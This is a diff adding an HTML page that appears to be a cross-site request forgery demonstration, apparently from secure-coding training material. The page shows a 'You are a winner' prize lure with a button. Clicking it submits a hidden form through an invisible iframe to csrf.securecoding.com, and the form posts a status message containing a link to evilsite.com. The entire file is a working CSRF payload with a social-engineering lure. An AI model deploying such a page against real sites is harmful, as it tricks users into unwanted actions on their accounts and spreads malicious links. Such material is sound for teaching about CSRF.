@@ -1,0 +1,21 @@
+<html>
+<body>
+<center>
+<img src="winner.gif" />
+<h1>You are a winner.</h1>
+<form name="csrf_form" action="http://csrf.securecoding.com/" method="POST" target="csrfFrame">
+    <input type="hidden" name="status" value="Wanna win?? &#x3C;a href=http:\\www.evilsite.com\winner.html&#x3E;Click here&#x3C;/a&#x3E; and you&#x27;re on your way!!">
+	<button onclick="claimPrize()">Click here to claim your prize!</button>
+</form>
+</center>
+<script type="text/javascript"></script>
+<script type="text/javascript">
+function claimPrize() {
+	document.csrf_form.submit();
+    alert("Yay, you won!!");
+}
+</script>
+<iframe name="csrfFrame" style="visibility:hidden"></iframe>
+</body>
+</html>
+
